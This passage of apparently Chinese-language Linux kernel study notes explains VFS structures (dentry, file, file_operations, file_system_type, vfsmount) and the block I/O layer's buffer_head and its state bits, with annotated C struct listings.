class="params">(struct dentry *old_dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct inode *dir, struct dentry *dentry)</span></span>; <span class="comment">/* 创建硬链接(链接名称由dentry参数指定),链接对象是dir目录中的old_dentry目录项所代表的文件 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_symlink</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *symname)</span></span>; <span class="comment">/* 创建符号链接,符号名称由symname指定,链接对象是dir目录中的dentry目录项所代表的文件 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_mkdir</span><span class="params">(struct inode *dir, </span></span></span><br><span class="line"><span class="params"><span class="function">                      struct dentry *dentry, <span class="keyword">umode_t</span> mode)</span></span>; <span class="comment">/* 创建一个新的目录,使用mode指定模式 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_mknod</span><span class="params">(struct inode *dir, struct dentry *dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		      <span class="keyword">umode_t</span> mode, <span class="keyword">dev_t</span> rdev)</span></span>; <span class="comment">/* 创建特殊文件,要创建的文件放在dir目录中,其目录项为dentry,关联的设备为rdev,初始权限由mode指定 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_rename</span><span class="params">(struct inode *old_dir, struct dentry *old_dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		       struct inode *new_dir, struct dentry *new_dentry,</span></span></span><br><span class="line"><span class="params"><span class="function">		       <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>; <span class="comment">/* 用于移动文件,文件源路径在old_dir目录中,源文件由old_dentry目录项指定,目标路径在new_dir目录中,目标文件由new_dentry指定 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ext4_setattr</span><span class="params">(struct dentry *dentry, struct iattr *attr)</span></span>; <span class="comment">/* 在修改了索引结点后,通知发生了&quot;改变事件&quot; */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ext4_getattr</span><span class="params">(<span class="keyword">const</span> struct path *path, struct kstat *stat,</span></span></span><br><span class="line"><span class="params"><span class="function">		 u32 request_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> query_flags)</span></span>; <span class="comment">/* 当收到&quot;改变事件&quot;的通知后,调用此函数进行处理 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_setxattr</span><span class="params">(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>; <span class="comment">/* 给dentry指定的文件设置扩展属性,属性名为name,值为value */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vfs_getxattr</span><span class="params">(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *name, </span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size)</span> <span class="comment">/* 检索扩展的属性值,属性名为name */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>目录项</strong></p>
<p>目录项不是目录，而是目录的组成部分</p>
<p>目录项是描述文件的逻辑属性，只存在于内存中，并不是实际存在于磁盘上，更确切的说是存在于内存的目录项缓存，为了提高查找性能而设计：</p>
<ul>
<li>在使用的时候在内存中创建目录项对象，其实通过索引节点已经可以定位到指定的文件</li>
<li>但是索引节点对象的属性非常多，在查找，比较文件时，直接用索引节点效率不高，所以引入了目录项的概念</li>
</ul>
<p>路径中的每个部分都是一个目录项</p>
<ul>
<li>比如路径：<code>/mnt/cdrom/foo/bar</code> </li>
<li>其中包含5个目录项：<code>/ mnt cdrom foo bar</code></li>
</ul>
<p>每个目录项对象都有3种状态：</p>
<ul>
<li>被使用：对应一个有效的索引节点，并且该对象由一个或多个使用者</li>
<li>未使用：对应一个有效的索引节点，但是VFS当前并没有使用这个目录项</li>
<li>负状态：没有对应的有效索引节点（可能索引节点被删除或者路径不存在了）</li>
</ul>
<p>描述目录项的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 目录项对象结构 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> d_count;       <span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;   <span class="comment">/* 目录项标识 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> d_lock;        <span class="comment">/* 单目录项锁 */</span></span><br><span class="line">    <span class="keyword">int</span> d_mounted;          <span class="comment">/* 是否登录点的目录项 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>    <span class="comment">/* 相关联的索引节点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_hash</span>;</span>    <span class="comment">/* 散列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>    <span class="comment">/* 父目录的目录项对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span>         <span class="comment">/* 目录项名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>        <span class="comment">/* 未使用的链表 */</span></span><br><span class="line">    <span class="comment">/* d_child and d_rcu can share memory */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>    <span class="comment">/* child of parent list */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">    &#125; d_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span>    <span class="comment">/* 子目录链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_alias</span>;</span>    <span class="comment">/* 索引节点别名链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;        <span class="comment">/* 重置时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span> <span class="comment">/* 目录项操作相关函数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>    <span class="comment">/* 文件的超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> *d_fsdata;            <span class="comment">/* 文件系统特有数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN_MIN];    <span class="comment">/* 短文件名 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 目录项相关操作函数 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 该函数判断目录项对象是否有效,VFS准备从dcache中使用一个目录项时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_revalidate)(struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 为目录项对象生成hash值 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_hash) (struct dentry *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 比较 qstr 类型的2个文件名 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_compare) (struct dentry *, struct qstr *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 当目录项对象的 d_count 为0时,VFS调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_delete)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 当目录项对象将要被释放时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_release)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 当目录项对象丢失其索引节点时（也就是磁盘索引节点被删除了）,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_iput)(struct dentry *, struct inode *);</span><br><span class="line">    <span class="keyword">char</span> *(*d_dname)(struct dentry *, <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>文件</strong></p>
<p>文件对象表示进程已打开的文件，从用户角度来看，我们在代码中操作的就是一个文件对象，它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息，它的作用范围是某一具体进程</p>
<ul>
<li>文件对象反过来指向一个目录项对象（目录项反过来指向一个索引节点）</li>
</ul>
<p>其实只有目录项对象才表示一个已打开的实际文件，虽然一个文件对应的文件对象不是唯一的，但其对应的索引节点和目录项对象却是唯一的</p>
<p>下面是用于描述文件的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span> <span class="comment">/* 文件对象链表 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span> <span class="comment">/* 释放之后的RCU链表 */</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span> <span class="comment">/* 包含的目录项 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span> <span class="comment">/* 索引结点 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span>;</span> <span class="comment">/* 指向操作file的回调函数集 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock; <span class="comment">/* 保护文件的自旋锁 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags; <span class="comment">/* 文件标志:O_RDONLY,O_NONBLOCK,O_SYNC */</span></span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode; <span class="comment">/* 文件读/写模式:FMODE_READ,FMODE_WRITE */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos; <span class="comment">/* 当前读写位置 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data; <span class="comment">/* 文件私有数据 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span> <span class="comment">/* 指向该页所在地址空间描述结构的指针 */</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* file_operations中定义了文件对象的操作方法 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 用于更新偏移量指针,由系统调用lleek()调用它 */</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 将给定文件映射到指定的地址空间上,由系统调用mmap调用它 */</span></span><br><span class="line">    <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">    <span class="comment">/* 创建一个新的文件对象,并将它和相应的索引节点对象关联起来 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="comment">/* 当已打开文件的引用计数减少时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>file_operations</code> 用于实现对于“特定文件系统”的系统调用</li>
<li>这里有点面向对象的味道，也是 VFS 可以兼容多种文件系统的原因</li>
</ul>
<p>四个对象之间关系图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661438949794-1666871176498.png" class width="1661438949794"> 
<p>除了 VFS 以外，内核必须提供 <code>file_system_type</code> 结构体来描述每种文件系统的功能和行为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">/* 文件系统名称 */</span></span><br><span class="line">	<span class="keyword">int</span> fs_flags; <span class="comment">/* 文件系统类型标志 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_REQUIRES_DEV		1 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_BINARY_MOUNTDATA	2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_HAS_SUBTYPE		4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_USERNS_MOUNT		8	<span class="comment">/* Can be mounted by userns root */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_RENAME_DOES_D_MOVE	32768	<span class="comment">/* FS will handle d_move() during rename() internally. */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *(*<span class="title">mount</span>) (<span class="keyword">struct</span> <span class="title">file_system_type</span> *, <span class="title">int</span>,</span></span><br><span class="line"><span class="class">		       <span class="title">const</span> <span class="title">char</span> *, <span class="title">void</span> *);</span></span><br><span class="line">	<span class="keyword">void</span> (*kill_sb) (struct super_block *);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span> <span class="comment">/* 文件系统模块 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span> <span class="comment">/* 链表中下一个文件系统类型 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span> <span class="comment">/* 超级块对象链表 */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>每种文件系统，不管是有多少个实例安装到系统上，还是根本就没有安装，都只能有一个 <code>file_system_type</code> 结构体</li>
</ul>
<p>当文件系统被实际安装时，将会有一个 <code>vfsmount</code> 结构体在安装点被创建，用来表示每个文件系统的实例：（代表一个安装点）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_root</span>;</span>	<span class="comment">/* root of the mounted tree */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">mnt_sb</span>;</span>	<span class="comment">/* pointer to superblock */</span></span><br><span class="line">	<span class="keyword">int</span> mnt_flags;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<h2 id="块I-O层"><a href="#块I-O层" class="headerlink" title="块I/O层"></a>块I/O层</h2><p>I/O设备主要有2类：</p>
<ul>
<li>字符设备：只能顺序读写设备中的内容（比如：串口设备，键盘）</li>
<li>块设备：能够随机读写设备中的内容（比如：硬盘，U盘）</li>
</ul>
<p>字符设备由于只能顺序访问，因此应用场景也不多，块设备是随机访问的，所以块设备在不同的应用场景中存在很大的优化空间：</p>
<ul>
<li>块设备的最小寻址单元就是扇区，扇区的大小是2的整数倍，一般是512字节</li>
<li>扇区是物理上的最小寻址单元，而逻辑上的最小寻址单元是块</li>
<li>为了便于文件系统管理，块的大小一般是扇区的整数倍，并且小于等于页的大小</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面  sudo fdisk -l</span><br><span class="line">[sudo] yhellow 的密码： </span><br><span class="line">Disk /dev/loop0：<span class="number">4</span> KiB，<span class="number">4096</span> 字节，<span class="number">8</span> 个扇区</span><br><span class="line">单元：扇区 / <span class="number">1</span> * <span class="number">512</span> = <span class="number">512</span> 字节</span><br><span class="line">扇区大小(逻辑/物理)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br><span class="line">I/O 大小(最小/最佳)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br></pre></td></tr></table></figure>
<p>块是文件系统的一种抽象：</p>
<ul>
<li>只能基于块来访问文件系统</li>
<li>磁盘的物理寻址是按照扇区进行的，但内核执行的所有磁盘操作都是按块进行的</li>
</ul>
<p><strong>内核访问块设备</strong></p>
<p>内核通过文件系统访问块设备时，需要先把块读入到内存中，所以文件系统为了管理块设备，必须管理[块]和内存页之间的映射</p>
<p>内核中有2种方法来管理 [<strong>块</strong>] 和内存页之间的映射：</p>
<p>一，缓冲区和缓冲区头：</p>
<ul>
<li>每个 [<strong>块</strong>] 都是一个缓冲区，同时对每个 [<strong>块</strong>] 都定义一个缓冲区头来描述它</li>
<li>由于 [<strong>块</strong>] 的大小是小于内存页的大小的，所以每个内存页会包含一个或者多个 [<strong>块</strong>]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;            <span class="comment">/* 表示缓冲区状态 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span>  <span class="comment">/* 当前页中缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span>              <span class="comment">/* 当前缓冲区所在内存页 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">sector_t</span> b_blocknr;       <span class="comment">/* 起始块号 */</span></span><br><span class="line">    <span class="keyword">size_t</span> b_size;            <span class="comment">/* buffer在内存中的大小 */</span></span><br><span class="line">    <span class="keyword">char</span> *b_data;             <span class="comment">/* 块映射在内存页中的数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span>  	 <span class="comment">/* 关联的块设备 */</span></span><br><span class="line">    <span class="keyword">bh_end_io_t</span> *b_end_io;       	 <span class="comment">/* I/O完成方法 */</span></span><br><span class="line">     <span class="keyword">void</span> *b_private;            	 <span class="comment">/* 保留的 I/O 完成方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span>     <span class="comment">/* 关联的其他缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span>    <span class="comment">/* 相关的地址空间 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> b_count;                     <span class="comment">/* 引用计数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>b_state</code>：表示缓冲区的状态，合法的标志存放在 <code>bh_state_bits</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bh_state_bits</span> &#123;</span></span><br><span class="line">	BH_Uptodate,	<span class="comment">/* 包含可用数据 */</span></span><br><span class="line">	BH_Dirty,	<span class="comment">/* 脏的 */</span></span><br><span class="line">	BH_Lock,	<span class="comment">/* 正在被IO操作使用(被锁定) */</span></span><br><span class="line">	BH_Req,		<span class="comment">/* 有IO请求 */</span></span><br><span class="line">	BH_Uptodate_Lock,<span class="comment">/* Used by the first bh in a page, to serialise IO completion of other buffers in the page */</span></span><br><span class="line"></span><br><span class="line">	BH_Mapped,	<span class="comment">/* 映射磁盘块 */</span></span><br><span class="line">	BH_New,		<span class="comment">/* 刚刚通过get_block映射,尚且不能访问 */</span></span><br><span class="line">	BH_Async_Read,	<span class="comment">/* 通过end_buffer_async_read,被异步IO读操作使用 */</span></span><br><span class="line">	BH_Async_Write,	<span class="comment">/* 通过end_buffer_async_write,被异步IO写操作使用 */</span></span><br><span class="line">	BH_Delay,		<span class="comment">/* 尚未和磁盘块关联 */</span></span><br><span class="line">	BH_Boundary,	<span class="comment">/* 处于连续区的边界(下一个块不再连续) */</span></span><br><span class="line">	BH_Write_EIO,	<span class="comment">/* 在写时遇到IO错误 */</span></span><br><span class="line">	BH_Unwritten,	<span class="comment">/* 在磁盘上的空间已经被申请但是没有数据写入 */</span></span><br><span class="line">	BH_Quiet,	<span class="comment">/* 禁止错误 */</span></span><br><span class="line">	BH_Meta,	<span class="comment">/* Buffer contains metadata */</span></span><br><span class="line">	BH_Prio,	<span class="comment">/* Buffer should be submitted with REQ_PRIO */</span></span><br><span class="line">	BH_Defer_Completion, <span class="comment">/* Defer AIO completion to workqueue */</span></span><br><span class="line"></span><br><span class="line">	BH_PrivateStart,	<span class="comment">/* 不是可用状态位,其目的是为了表明起始位 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>b_count</code>：表示缓冲区的使用计数</li>
</ul>
